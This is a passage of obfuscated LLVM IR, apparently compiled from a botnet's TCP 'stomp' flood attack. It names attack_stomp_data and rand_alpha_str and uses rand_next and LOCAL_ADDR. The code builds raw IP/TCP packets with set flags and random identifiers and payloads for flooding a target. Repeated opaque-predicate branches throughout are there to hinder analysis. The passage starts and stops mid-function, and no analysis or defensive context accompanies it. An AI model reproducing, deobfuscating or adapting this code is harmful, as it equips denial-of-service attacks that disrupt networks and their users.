  %278 = load i32, i32* %277, align 4
  %279 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 2
  %280 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %279, i32 0, i32 0
  %281 = load i32, i32* %280, align 4
  %282 = icmp eq i32 %278, %281
  br i1 %282, label %283, label %670

; <label>:283:                                    ; preds = %275
  %284 = load i32, i32* @x.25
  %285 = load i32, i32* @y.26
  %286 = sub i32 %284, 1
  %287 = mul i32 %284, %286
  %288 = urem i32 %287, 2
  %289 = icmp eq i32 %288, 0
  %290 = icmp slt i32 %285, 10
  %291 = or i1 %289, %290
  br i1 %291, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %283
  %292 = load i32, i32* %36, align 4
  %293 = sext i32 %292 to i64
  %294 = icmp ugt i64 %293, 40
  %295 = load i32, i32* @x.25
  %296 = load i32, i32* @y.26
  %297 = sub i32 %295, 1
  %298 = mul i32 %295, %297
  %299 = urem i32 %298, 2
  %300 = icmp eq i32 %299, 0
  %301 = icmp slt i32 %296, 10
  %302 = or i1 %300, %301
  br i1 %302, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %294, label %303, label %670

; <label>:303:                                    ; preds = %originalBBpart216
  %304 = load i32, i32* @x.25
  %305 = load i32, i32* @y.26
  %306 = sub i32 %304, 1
  %307 = mul i32 %304, %306
  %308 = urem i32 %307, 2
  %309 = icmp eq i32 %308, 0
  %310 = icmp slt i32 %305, 10
  %311 = or i1 %309, %310
  br i1 %311, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %303
  %312 = getelementptr inbounds [256 x i8], [256 x i8]* %33, i32 0, i32 0
  %313 = getelementptr inbounds i8, i8* %312, i64 20
  %314 = bitcast i8* %313 to %struct.tcphdr*
  store %struct.tcphdr* %314, %struct.tcphdr** %38, align 8
  %315 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %316 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %315, i32 0, i32 0
  %317 = load i16, i16* %316, align 4
  %318 = zext i16 %317 to i32
  %319 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 1
  %320 = load i16, i16* %319, align 2
  %321 = zext i16 %320 to i32
  %322 = icmp eq i32 %318, %321
  %323 = load i32, i32* @x.25
  %324 = load i32, i32* @y.26
  %325 = sub i32 %323, 1
  %326 = mul i32 %323, %325
  %327 = urem i32 %326, 2
  %328 = icmp eq i32 %327, 0
  %329 = icmp slt i32 %324, 10
  %330 = or i1 %328, %329
  br i1 %330, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %322, label %331, label %669

; <label>:331:                                    ; preds = %originalBBpart220
  %332 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %333 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %332, i32 0, i32 4
  %334 = load i16, i16* %333, align 4
  %335 = lshr i16 %334, 9
  %336 = and i16 %335, 1
  %337 = zext i16 %336 to i32
  %338 = icmp ne i32 %337, 0
  br i1 %338, label %339, label %600

; <label>:339:                                    ; preds = %331
  %340 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %341 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %340, i32 0, i32 4
  %342 = load i16, i16* %341, align 4
  %343 = lshr i16 %342, 12
  %344 = and i16 %343, 1
  %345 = zext i16 %344 to i32
  %346 = icmp ne i32 %345, 0
  br i1 %346, label %347, label %600

; <label>:347:                                    ; preds = %339
  %348 = load i32, i32* @x.25
  %349 = load i32, i32* @y.26
  %350 = sub i32 %348, 1
  %351 = mul i32 %348, %350
  %352 = urem i32 %351, 2
  %353 = icmp eq i32 %352, 0
  %354 = icmp slt i32 %349, 10
  %355 = or i1 %353, %354
  br i1 %355, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %347
  %356 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 2
  %357 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %356, i32 0, i32 0
  %358 = load i32, i32* %357, align 4
  %359 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %360 = load i32, i32* %11, align 4
  %361 = sext i32 %360 to i64
  %362 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %359, i64 %361
  %363 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %362, i32 0, i32 0
  store i32 %358, i32* %363, align 4
  %364 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %365 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %364, i32 0, i32 2
  %366 = load i32, i32* %365, align 4
  %367 = call i32 @ntohl(i32 %366) #7
  %368 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %369 = load i32, i32* %11, align 4
  %370 = sext i32 %369 to i64
  %371 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %368, i64 %370
  %372 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %371, i32 0, i32 1
  store i32 %367, i32* %372, align 4
  %373 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %374 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %373, i32 0, i32 3
  %375 = load i32, i32* %374, align 4
  %376 = call i32 @ntohl(i32 %375) #7
  %377 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %378 = load i32, i32* %11, align 4
  %379 = sext i32 %378 to i64
  %380 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %377, i64 %379
  %381 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %380, i32 0, i32 2
  store i32 %376, i32* %381, align 4
  %382 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %383 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %382, i32 0, i32 1
  %384 = load i16, i16* %383, align 2
  %385 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %386 = load i32, i32* %11, align 4
  %387 = sext i32 %386 to i64
  %388 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %385, i64 %387
  %389 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %388, i32 0, i32 3
  store i16 %384, i16* %389, align 4
  %390 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 1
  %391 = load i16, i16* %390, align 2
  %392 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %393 = load i32, i32* %11, align 4
  %394 = sext i32 %393 to i64
  %395 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %392, i64 %394
  %396 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %395, i32 0, i32 4
  store i16 %391, i16* %396, align 2
  %397 = load i32, i32* %26, align 4
  %398 = sext i32 %397 to i64
  %399 = add i64 40, %398
  %400 = call noalias i8* @malloc(i64 %399) #6
  %401 = load i8**, i8*** %14, align 8
  %402 = load i32, i32* %11, align 4
  %403 = sext i32 %402 to i64
  %404 = getelementptr inbounds i8*, i8** %401, i64 %403
  store i8* %400, i8** %404, align 8
  %405 = load i8**, i8*** %14, align 8
  %406 = load i32, i32* %11, align 4
  %407 = sext i32 %406 to i64
  %408 = getelementptr inbounds i8*, i8** %405, i64 %407
  %409 = load i8*, i8** %408, align 8
  %410 = bitcast i8* %409 to %struct.iphdr*
  store %struct.iphdr* %410, %struct.iphdr** %39, align 8
  %411 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %412 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %411, i64 1
  %413 = bitcast %struct.iphdr* %412 to %struct.tcphdr*
  store %struct.tcphdr* %413, %struct.tcphdr** %40, align 8
  %414 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %415 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %414, i64 1
  %416 = bitcast %struct.tcphdr* %415 to i8*
  store i8* %416, i8** %41, align 8
  %417 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %418 = bitcast %struct.iphdr* %417 to i8*
  %419 = load i8, i8* %418, align 4
  %420 = and i8 %419, 15
  %421 = or i8 %420, 64
  store i8 %421, i8* %418, align 4
  %422 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %423 = bitcast %struct.iphdr* %422 to i8*
  %424 = load i8, i8* %423, align 4
  %425 = and i8 %424, -16
  %426 = or i8 %425, 5
  store i8 %426, i8* %423, align 4
  %427 = load i8, i8* %15, align 1
  %428 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %429 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %428, i32 0, i32 1
  store i8 %427, i8* %429, align 1
  %430 = load i32, i32* %26, align 4
  %431 = sext i32 %430 to i64
  %432 = add i64 40, %431
  %433 = trunc i64 %432 to i16
  %434 = call zeroext i16 @htons(i16 zeroext %433) #7
  %435 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %436 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %435, i32 0, i32 2
  store i16 %434, i16* %436, align 2
  %437 = load i16, i16* %16, align 2
  %438 = call zeroext i16 @htons(i16 zeroext %437) #7
  %439 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %440 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %439, i32 0, i32 3
  store i16 %438, i16* %440, align 4
  %441 = load i8, i8* %17, align 1
  %442 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %443 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %442, i32 0, i32 5
  store i8 %441, i8* %443, align 4
  %444 = load i8, i8* %18, align 1
  %445 = icmp ne i8 %444, 0
  %446 = load i32, i32* @x.25
  %447 = load i32, i32* @y.26
  %448 = sub i32 %446, 1
  %449 = mul i32 %446, %448
  %450 = urem i32 %449, 2
  %451 = icmp eq i32 %450, 0
  %452 = icmp slt i32 %447, 10
  %453 = or i1 %451, %452
  br i1 %453, label %originalBBpart265, label %originalBB22alteredBB

originalBBpart265:                                ; preds = %originalBB22
  br i1 %445, label %454, label %458

; <label>:454:                                    ; preds = %originalBBpart265
  %455 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %456 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %457 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %456, i32 0, i32 4
  store i16 %455, i16* %457, align 2
  br label %458

; <label>:458:                                    ; preds = %454, %originalBBpart265
  %459 = load i32, i32* @x.25
  %460 = load i32, i32* @y.26
  %461 = sub i32 %459, 1
  %462 = mul i32 %459, %461
  %463 = urem i32 %462, 2
  %464 = icmp eq i32 %463, 0
  %465 = icmp slt i32 %460, 10
  %466 = or i1 %464, %465
  br i1 %466, label %originalBB67, label %originalBB67alteredBB

originalBB67:                                     ; preds = %originalBB67alteredBB, %458
  %467 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %468 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %467, i32 0, i32 6
  store i8 6, i8* %468, align 1
  %469 = load i32, i32* @LOCAL_ADDR, align 4
  %470 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %471 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %470, i32 0, i32 8
  store i32 %469, i32* %471, align 4
  %472 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %473 = load i32, i32* %11, align 4
  %474 = sext i32 %473 to i64
  %475 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %472, i64 %474
  %476 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %475, i32 0, i32 0
  %477 = load i32, i32* %476, align 4
  %478 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %479 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %478, i32 0, i32 9
  store i32 %477, i32* %479, align 4
  %480 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %481 = load i32, i32* %11, align 4
  %482 = sext i32 %481 to i64
  %483 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %480, i64 %482
  %484 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %483, i32 0, i32 3
  %485 = load i16, i16* %484, align 4
  %486 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %487 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %486, i32 0, i32 0
  store i16 %485, i16* %487, align 4
  %488 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %489 = load i32, i32* %11, align 4
  %490 = sext i32 %489 to i64
  %491 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %488, i64 %490
  %492 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %491, i32 0, i32 4
  %493 = load i16, i16* %492, align 2
  %494 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %495 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %494, i32 0, i32 1
  store i16 %493, i16* %495, align 2
  %496 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %497 = load i32, i32* %11, align 4
  %498 = sext i32 %497 to i64
  %499 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %496, i64 %498
  %500 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %499, i32 0, i32 2
  %501 = load i32, i32* %500, align 4
  %502 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %503 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %502, i32 0, i32 2
  store i32 %501, i32* %503, align 4
  %504 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %505 = load i32, i32* %11, align 4
  %506 = sext i32 %505 to i64
  %507 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %504, i64 %506
  %508 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %507, i32 0, i32 1
  %509 = load i32, i32* %508, align 4
  %510 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %511 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %510, i32 0, i32 3
  store i32 %509, i32* %511, align 4
  %512 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %513 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %512, i32 0, i32 4
  %514 = load i16, i16* %513, align 4
  %515 = and i16 %514, -241
  %516 = or i16 %515, 128
  store i16 %516, i16* %513, align 4
  %517 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %518 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %517, i32 0, i32 4
  %519 = load i16, i16* %518, align 4
  %520 = and i16 %519, -257
  %521 = or i16 %520, 256
  store i16 %521, i16* %518, align 4
  %522 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %523 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %522, i32 0, i32 4
  %524 = load i16, i16* %523, align 4
  %525 = and i16 %524, -4097
  %526 = or i16 %525, 4096
  store i16 %526, i16* %523, align 4
  %527 = call i32 @rand_next()
  %528 = and i32 %527, 65535
  %529 = trunc i32 %528 to i16
  %530 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %531 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %530, i32 0, i32 5
  store i16 %529, i16* %531, align 2
  %532 = load i8, i8* %20, align 1
  %533 = sext i8 %532 to i16
  %534 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %535 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %534, i32 0, i32 4
  %536 = load i16, i16* %535, align 4
  %537 = and i16 %533, 1
  %538 = shl i16 %537, 13
  %539 = and i16 %536, -8193
  %540 = or i16 %539, %538
  store i16 %540, i16* %535, align 4
  %541 = load i8, i8* %21, align 1
  %542 = sext i8 %541 to i16
  %543 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %544 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %543, i32 0, i32 4
  %545 = load i16, i16* %544, align 4
  %546 = and i16 %542, 1
  %547 = shl i16 %546, 12
  %548 = and i16 %545, -4097
  %549 = or i16 %548, %547
  store i16 %549, i16* %544, align 4
  %550 = load i8, i8* %22, align 1
  %551 = sext i8 %550 to i16
  %552 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %553 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %552, i32 0, i32 4
  %554 = load i16, i16* %553, align 4
  %555 = and i16 %551, 1
  %556 = shl i16 %555, 11
  %557 = and i16 %554, -2049
  %558 = or i16 %557, %556
  store i16 %558, i16* %553, align 4
  %559 = load i8, i8* %23, align 1
  %560 = sext i8 %559 to i16
  %561 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %562 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %561, i32 0, i32 4
  %563 = load i16, i16* %562, align 4
  %564 = and i16 %560, 1
  %565 = shl i16 %564, 10
  %566 = and i16 %563, -1025
  %567 = or i16 %566, %565
  store i16 %567, i16* %562, align 4
  %568 = load i8, i8* %24, align 1
  %569 = sext i8 %568 to i16
  %570 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %571 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %570, i32 0, i32 4
  %572 = load i16, i16* %571, align 4
  %573 = and i16 %569, 1
  %574 = shl i16 %573, 9
  %575 = and i16 %572, -513
  %576 = or i16 %575, %574
  store i16 %576, i16* %571, align 4
  %577 = load i8, i8* %25, align 1
  %578 = sext i8 %577 to i16
  %579 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %580 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %579, i32 0, i32 4
  %581 = load i16, i16* %580, align 4
  %582 = and i16 %578, 1
  %583 = shl i16 %582, 8
  %584 = and i16 %581, -257
  %585 = or i16 %584, %583
  store i16 %585, i16* %580, align 4
  %586 = load i8*, i8** %41, align 8
  %587 = load i32, i32* %26, align 4
  call void @rand_alpha_str(i8* %586, i32 %587)
  %588 = load i8*, i8** %41, align 8
  %589 = load i32, i32* %26, align 4
  %590 = sext i32 %589 to i64
  %591 = getelementptr inbounds i8, i8* %588, i64 %590
  store i8 0, i8* %591, align 1
  %592 = load i32, i32* @x.25
  %593 = load i32, i32* @y.26
  %594 = sub i32 %592, 1
  %595 = mul i32 %592, %594
  %596 = urem i32 %595, 2
  %597 = icmp eq i32 %596, 0
  %598 = icmp slt i32 %593, 10
  %599 = or i1 %597, %598
  br i1 %599, label %originalBBpart2301, label %originalBB67alteredBB

originalBBpart2301:                               ; preds = %originalBB67
  br label %711

; <label>:600:                                    ; preds = %339, %331
  %601 = load i32, i32* @x.25
  %602 = load i32, i32* @y.26
  %603 = sub i32 %601, 1
  %604 = mul i32 %601, %603
  %605 = urem i32 %604, 2
  %606 = icmp eq i32 %605, 0
  %607 = icmp slt i32 %602, 10
  %608 = or i1 %606, %607
  br i1 %608, label %originalBB303, label %originalBB303alteredBB

originalBB303:                                    ; preds = %originalBB303alteredBB, %600
  %609 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %610 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %609, i32 0, i32 4
  %611 = load i16, i16* %610, align 4
  %612 = lshr i16 %611, 8
  %613 = and i16 %612, 1
  %614 = zext i16 %613 to i32
  %615 = icmp ne i32 %614, 0
  %616 = load i32, i32* @x.25
  %617 = load i32, i32* @y.26
  %618 = sub i32 %616, 1
  %619 = mul i32 %616, %618
  %620 = urem i32 %619, 2
  %621 = icmp eq i32 %620, 0
  %622 = icmp slt i32 %617, 10
  %623 = or i1 %621, %622
  br i1 %623, label %originalBBpart2309, label %originalBB303alteredBB

originalBBpart2309:                               ; preds = %originalBB303
  br i1 %615, label %648, label %624

; <label>:624:                                    ; preds = %originalBBpart2309
  %625 = load i32, i32* @x.25
  %626 = load i32, i32* @y.26
  %627 = sub i32 %625, 1
  %628 = mul i32 %625, %627
  %629 = urem i32 %628, 2
  %630 = icmp eq i32 %629, 0
  %631 = icmp slt i32 %626, 10
  %632 = or i1 %630, %631
  br i1 %632, label %originalBB311, label %originalBB311alteredBB

originalBB311:                                    ; preds = %originalBB311alteredBB, %624
  %633 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %634 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %633, i32 0, i32 4
  %635 = load i16, i16* %634, align 4
  %636 = lshr i16 %635, 10
  %637 = and i16 %636, 1
  %638 = zext i16 %637 to i32
  %639 = icmp ne i32 %638, 0
  %640 = load i32, i32* @x.25
  %641 = load i32, i32* @y.26
  %642 = sub i32 %640, 1
  %643 = mul i32 %640, %642
  %644 = urem i32 %643, 2
  %645 = icmp eq i32 %644, 0
  %646 = icmp slt i32 %641, 10
  %647 = or i1 %645, %646
  br i1 %647, label %originalBBpart2320, label %originalBB311alteredBB

originalBBpart2320:                               ; preds = %originalBB311
  br i1 %639, label %648, label %651

; <label>:648:                                    ; preds = %originalBBpart2320, %originalBBpart2309
  %649 = load i32, i32* %29, align 4
  %650 = call i32 @close(i32 %649)
  br label %161

; <label>:651:                                    ; preds = %originalBBpart2320
  %652 = load i32, i32* @x.25
  %653 = load i32, i32* @y.26
  %654 = sub i32 %652, 1
  %655 = mul i32 %652, %654
  %656 = urem i32 %655, 2
  %657 = icmp eq i32 %656, 0
  %658 = icmp slt i32 %653, 10
  %659 = or i1 %657, %658
  br i1 %659, label %originalBB322, label %originalBB322alteredBB

originalBB322:                                    ; preds = %originalBB322alteredBB, %651
  %660 = load i32, i32* @x.25
  %661 = load i32, i32* @y.26
  %662 = sub i32 %660, 1
  %663 = mul i32 %660, %662
  %664 = urem i32 %663, 2
  %665 = icmp eq i32 %664, 0
  %666 = icmp slt i32 %661, 10
  %667 = or i1 %665, %666
  br i1 %667, label %originalBBpart2324, label %originalBB322alteredBB

originalBBpart2324:                               ; preds = %originalBB322
  br label %668

; <label>:668:                                    ; preds = %originalBBpart2324
  br label %669

; <label>:669:                                    ; preds = %668, %originalBBpart220
  br label %670

; <label>:670:                                    ; preds = %669, %originalBBpart216, %275
  %671 = load i32, i32* @x.25
  %672 = load i32, i32* @y.26
  %673 = sub i32 %671, 1
  %674 = mul i32 %671, %673
  %675 = urem i32 %674, 2
  %676 = icmp eq i32 %675, 0
  %677 = icmp slt i32 %672, 10
  %678 = or i1 %676, %677
  br i1 %678, label %originalBB326, label %originalBB326alteredBB

originalBB326:                                    ; preds = %originalBB326alteredBB, %670
  %679 = call i64 @time(i64* null) #6
  %680 = load i64, i64* %34, align 8
  %681 = sub nsw i64 %679, %680
  %682 = icmp sgt i64 %681, 10
  %683 = load i32, i32* @x.25
  %684 = load i32, i32* @y.26
  %685 = sub i32 %683, 1
  %686 = mul i32 %683, %685
  %687 = urem i32 %686, 2
  %688 = icmp eq i32 %687, 0
  %689 = icmp slt i32 %684, 10
  %690 = or i1 %688, %689
  br i1 %690, label %originalBBpart2333, label %originalBB326alteredBB

originalBBpart2333:                               ; preds = %originalBB326
  br i1 %682, label %691, label %710

; <label>:691:                                    ; preds = %originalBBpart2333
  %692 = load i32, i32* @x.25
  %693 = load i32, i32* @y.26
  %694 = sub i32 %692, 1
  %695 = mul i32 %692, %694
  %696 = urem i32 %695, 2
  %697 = icmp eq i32 %696, 0
  %698 = icmp slt i32 %693, 10
  %699 = or i1 %697, %698
  br i1 %699, label %originalBB335, label %originalBB335alteredBB

originalBB335:                                    ; preds = %originalBB335alteredBB, %691
  %700 = load i32, i32* %29, align 4
  %701 = call i32 @close(i32 %700)
  %702 = load i32, i32* @x.25
  %703 = load i32, i32* @y.26
  %704 = sub i32 %702, 1
  %705 = mul i32 %702, %704
  %706 = urem i32 %705, 2
  %707 = icmp eq i32 %706, 0
  %708 = icmp slt i32 %703, 10
  %709 = or i1 %707, %708
  br i1 %709, label %originalBBpart2337, label %originalBB335alteredBB

originalBBpart2337:                               ; preds = %originalBB335
  br label %161

; <label>:710:                                    ; preds = %originalBBpart2333
  br label %247

; <label>:711:                                    ; preds = %originalBBpart2301
  br label %712

; <label>:712:                                    ; preds = %711, %164
  %713 = load i32, i32* @x.25
  %714 = load i32, i32* @y.26
  %715 = sub i32 %713, 1
  %716 = mul i32 %713, %715
  %717 = urem i32 %716, 2
  %718 = icmp eq i32 %717, 0
  %719 = icmp slt i32 %714, 10
  %720 = or i1 %718, %719
  br i1 %720, label %originalBB339, label %originalBB339alteredBB

originalBB339:                                    ; preds = %originalBB339alteredBB, %712
  %721 = load i32, i32* %11, align 4
  %722 = add nsw i32 %721, 1
  store i32 %722, i32* %11, align 4
  %723 = load i32, i32* @x.25
  %724 = load i32, i32* @y.26
  %725 = sub i32 %723, 1
  %726 = mul i32 %723, %725
  %727 = urem i32 %726, 2
  %728 = icmp eq i32 %727, 0
  %729 = icmp slt i32 %724, 10
  %730 = or i1 %728, %729
  br i1 %730, label %originalBBpart2345, label %originalBB339alteredBB

originalBBpart2345:                               ; preds = %originalBB339
  br label %139

; <label>:731:                                    ; preds = %originalBBpart24
  %732 = load i32, i32* @x.25
  %733 = load i32, i32* @y.26
  %734 = sub i32 %732, 1
  %735 = mul i32 %732, %734
  %736 = urem i32 %735, 2
  %737 = icmp eq i32 %736, 0
  %738 = icmp slt i32 %733, 10
  %739 = or i1 %737, %738
  br i1 %739, label %originalBB347, label %originalBB347alteredBB

originalBB347:                                    ; preds = %originalBB347alteredBB, %731
  %740 = load i32, i32* @x.25
  %741 = load i32, i32* @y.26
  %742 = sub i32 %740, 1
  %743 = mul i32 %740, %742
  %744 = urem i32 %743, 2
  %745 = icmp eq i32 %744, 0
  %746 = icmp slt i32 %741, 10
  %747 = or i1 %745, %746
  br i1 %747, label %originalBBpart2349, label %originalBB347alteredBB

originalBBpart2349:                               ; preds = %originalBB347
  br label %748

; <label>:748:                                    ; preds = %916, %originalBBpart2349
  store i32 0, i32* %11, align 4
  br label %749

; <label>:749:                                    ; preds = %891, %748
  %750 = load i32, i32* @x.25
  %751 = load i32, i32* @y.26
  %752 = sub i32 %750, 1
  %753 = mul i32 %750, %752
  %754 = urem i32 %753, 2
  %755 = icmp eq i32 %754, 0
  %756 = icmp slt i32 %751, 10
  %757 = or i1 %755, %756
  br i1 %757, label %originalBB351, label %originalBB351alteredBB

originalBB351:                                    ; preds = %originalBB351alteredBB, %749
  %758 = load i32, i32* %11, align 4
  %759 = load i8, i8* %7, align 1
  %760 = zext i8 %759 to i32
  %761 = icmp slt i32 %758, %760
  %762 = load i32, i32* @x.25
  %763 = load i32, i32* @y.26
  %764 = sub i32 %762, 1
  %765 = mul i32 %762, %764
  %766 = urem i32 %765, 2
  %767 = icmp eq i32 %766, 0
  %768 = icmp slt i32 %763, 10
  %769 = or i1 %767, %768
  br i1 %769, label %originalBBpart2353, label %originalBB351alteredBB

originalBBpart2353:                               ; preds = %originalBB351
  br i1 %761, label %770, label %894

; <label>:770:                                    ; preds = %originalBBpart2353
  %771 = load i8**, i8*** %14, align 8
  %772 = load i32, i32* %11, align 4
  %773 = sext i32 %772 to i64
  %774 = getelementptr inbounds i8*, i8** %771, i64 %773
  %775 = load i8*, i8** %774, align 8
  store i8* %775, i8** %42, align 8
  %776 = load i8*, i8** %42, align 8
  %777 = bitcast i8* %776 to %struct.iphdr*
  store %struct.iphdr* %777, %struct.iphdr** %43, align 8
  %778 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %779 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %778, i64 1
  %780 = bitcast %struct.iphdr* %779 to %struct.tcphdr*
  store %struct.tcphdr* %780, %struct.tcphdr** %44, align 8
  %781 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %782 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %781, i64 1
  %783 = bitcast %struct.tcphdr* %782 to i8*
  store i8* %783, i8** %45, align 8
  %784 = load i16, i16* %16, align 2
  %785 = zext i16 %784 to i32
  %786 = icmp eq i32 %785, 65535
  br i1 %786, label %787, label %793

; <label>:787:                                    ; preds = %770
  %788 = call i32 @rand_next()
  %789 = and i32 %788, 65535
  %790 = trunc i32 %789 to i16
  %791 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %792 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %791, i32 0, i32 3
  store i16 %790, i16* %792, align 4
  br label %793

; <label>:793:                                    ; preds = %787, %770
  %794 = load i8, i8* %27, align 1
  %795 = icmp ne i8 %794, 0
  br i1 %795, label %796, label %819

; <label>:796:                                    ; preds = %793
  %797 = load i32, i32* @x.25
  %798 = load i32, i32* @y.26
  %799 = sub i32 %797, 1
  %800 = mul i32 %797, %799
  %801 = urem i32 %800, 2
  %802 = icmp eq i32 %801, 0
  %803 = icmp slt i32 %798, 10
  %804 = or i1 %802, %803
  br i1 %804, label %originalBB355, label %originalBB355alteredBB

originalBB355:                                    ; preds = %originalBB355alteredBB, %796
  %805 = load i8*, i8** %45, align 8
  %806 = load i32, i32* %26, align 4
  call void @rand_alpha_str(i8* %805, i32 %806)
  %807 = load i8*, i8** %45, align 8
  %808 = load i32, i32* %26, align 4
  %809 = sext i32 %808 to i64
  %810 = getelementptr inbounds i8, i8* %807, i64 %809
  store i8 0, i8* %810, align 1
  %811 = load i32, i32* @x.25
  %812 = load i32, i32* @y.26
  %813 = sub i32 %811, 1
  %814 = mul i32 %811, %813
  %815 = urem i32 %814, 2
  %816 = icmp eq i32 %815, 0
